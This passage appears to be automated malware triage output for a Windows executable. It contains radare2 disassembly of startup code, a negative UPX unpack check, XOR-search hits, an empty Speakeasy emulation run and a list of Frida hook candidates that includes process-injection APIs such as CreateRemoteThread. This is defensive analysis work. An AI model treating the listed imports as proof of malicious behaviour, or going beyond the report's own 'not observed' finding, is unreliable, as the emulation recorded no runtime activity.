│       └─> 0x14000102c      89d0           mov eax, edx               ; synchapi.h:123:0
└           0x14000102e      c3             ret
```
### 0x140001030
```asm
; DATA XREF from sym.__tmainCRTStartup @ 0x140001185(r)
┌ 7: sym.safe_flush ();
│           0x140001030      31c9           xor ecx, ecx               ; synchapi.h:127:0
└       ┌─< 0x140001032      e9b1190000     jmp sym.fflush             ; synchapi.h:129:0
```
### 0x140001040
```asm
┌ 980: sym.__tmainCRTStartup (int64_t arg_1h);
│           ; arg int64_t arg_1h @ rbp+0x1
│           ; var int64_t var_20h @ rsp+0x20
│           ; var int64_t var_3ch @ rsp+0x3c
│           ; var int64_t var_4ch @ rsp+0x4c
│           0x140001040      4157           push r15                   ; synchapi.h:157:0
│           0x140001042      4156           push r14
│           0x140001044      4155           push r13
│           0x140001046      4154           push r12
│           0x140001048      55             push rbp
│           0x140001049      57             push rdi
│           0x14000104a      56             push rsi
│           0x14000104b      53             push rbx
│           0x14000104c      4883ec58       sub rsp, 0x58
│           0x140001050      65488b0425..   mov rax, qword gs:[0x30]   ; synchapi.h:167:0
│           0x140001059      488b7008       mov rsi, qword [rax + 8]   ; synchapi.h:175:0
│           0x14000105d      488b1dec03..   mov rbx, qword [0x140071450] ; synchapi.h:176:0 ; [0x140071450:8]=0x140074040
│           0x140001064      488b3d6543..   mov rdi, qword [sym.imp.KERNEL32.dll_Sleep] ; synchapi.h:187:0 ; [0x1400753d0:8]=0x7572c reloc.KERNEL32.dll_Sleep ; ",W\a"
│       ┌─< 0x14000106b      eb13           jmp 0x140001080            ; synchapi.h:179:0
..
│      ┌──> 0x140001070      4839c6         cmp rsi, rax               ; synchapi.h:182:0
│     ┌───< 0x140001073      0f84af000000   je 0x140001128
│     │╎│   0x140001079      b9e8030000     mov ecx, 0x3e8             ; synchapi.h:187:0 ; 1000
│     │╎│   0x14000107e      ffd7           call rdi
│     │╎│   ; CODE XREF from sym.__tmainCRTStartup @ 0x14000106b(x)
│     │╎└─> 0x140001080      31c0           xor eax, eax               ; synchapi.h:180:0
│     │╎    0x140001082      f0480fb133     lock cmpxchg qword [rbx], rsi
│     │└──< 0x140001087      75e7           jne 0x140001070
│     │     0x140001089      4531f6         xor r14d, r14d             ; synchapi.h:176:0
│     │     ; CODE XREF from sym.__tmainCRTStartup @ 0x14000112e(x)
│     │ ┌─> 0x14000108c      4c8b25cd03..   mov r12, qword [str.H__a_] ; synchapi.h:189:0 ; [0x140071460:8]=0x140074048 ; "H@\a@\x01"
│     │ ╎   0x140001093      41833c2401     cmp dword [r12], 1
│     │┌──< 0x140001098      0f848c030000   je 0x14000142a
│     ││╎   0x14000109e      458b1c24       mov r11d, dword [r12]      ; synchapi.h:193:0
│     ││╎   0x1400010a2      4585db         test r11d, r11d
│    ┌────< 0x1400010a5      0f84b5000000   je 0x140001160
│    │││╎   0x1400010ab      c7054f2f07..   mov dword [0x140074004], 1 ; synchapi.h:264:0 ; [0x140074004:4]=0
│    │││╎   ; CODE XREF from sym.__tmainCRTStartup @ 0x1400013d0(x)
│   ┌─────> 0x1400010b5      4585f6         test r14d, r14d            ; synchapi.h:265:0
│  ┌──────< 0x1400010b8      0f8492000000   je 0x140001150
│  │╎│││╎   ; CODE XREF from sym.__tmainCRTStartup @ 0x140001155(x)
│ ┌───────> 0x1400010be      488b051b03..   mov rax, qword [0x1400713e0] ; synchapi.h
```

## UPX Unpack
- upx_ok: False
- is_packed: False
- returncode: None
- unpacked_path: ``

## XOR Search
- Found XOR 00 position 00000000: 00000080 ........!..L.!This program cannot be r
- Found XOR 00 position 00002420: 00000080 ........!..L.!This program cannot be r

## Speakeasy (dynamic)
- speakeasy_ok: True
- api_calls: 0
- key_events: 0
- duration_s: None
- **not observed**: no API calls/events recorded — do not invent runtime behavior

## Frida Probe
- frida_available: True
- version: 17.16.4
- hook_candidates:
  - `KERNEL32.dll!CloseHandle`
  - `KERNEL32.dll!CreateFileW`
  - `KERNEL32.dll!CreateRemoteThread`
  - `KERNEL32.dll!CreateToolhelp32Snapshot`
  - `KERNEL32.dll!DeleteCriticalSection`
  - `api-ms-win-crt-environment-l1-1-0.dll!__p__environ`
  - `api-ms-win-crt-heap-l1-1-0.dll!_set_new_mode`
  - `api-ms-win-crt-heap-l1-1-0.dll!calloc`
  - `api-ms-win-crt-heap-l1-1-0.dll!free`
  - `api-ms-win-crt-heap-l1-1-0.dll!malloc`
  - `api-ms-win-crt-locale-l1-1-0.dll!_configthreadlocale`
  - `api-ms-win-crt-math-l1-1-0.dll!__setusermatherr`
  - `api-ms-win-crt-private-l1-1-0.dll!memcpy`
  - `api-ms-win-crt-runtime-l1-1-0.dll!__p___argc`
  - `api-ms-win-crt-runtime-l1-1-0.dll!__p___argv`
  - `api-ms-win-crt-runtime-l1-1-0.dll!__p__acmdln`
  - `api-ms-win-crt-runtime-l1-1-0.dll!_cexit`
  - `api-ms-win-crt-runtime-l1-1-0.dll!_configure_narrow_argv`
  - `api-ms-win-crt-stdio-l1-1-0.dll!__acrt_iob_func`
  - `api-ms-win-crt-stdio-l1-1-0.dll!__p__commode`
  - `api-ms-win-crt-stdio-l1-1-0.dll!__p__fmode`
  - `api-ms-win-crt-stdio-l1-1-0.dll!__stdio_common_vfprintf`
  - `api-ms-win-crt-stdio-l1-1-0.dll!__stdio_common_vswprintf`
  - `api-ms-win-crt-string-l1-1-0.dll!_stricmp`
  - `api-ms-win-crt-string-l1-1-0.dll!memset`
  - `api-ms-win-crt-string-l1-1-0.dll!strlen`
  - `api-ms-win-crt-string-l1-1-0.dll!strncmp`
  - `api-ms-win-crt-string-l1-1-0.dll!wcslen`
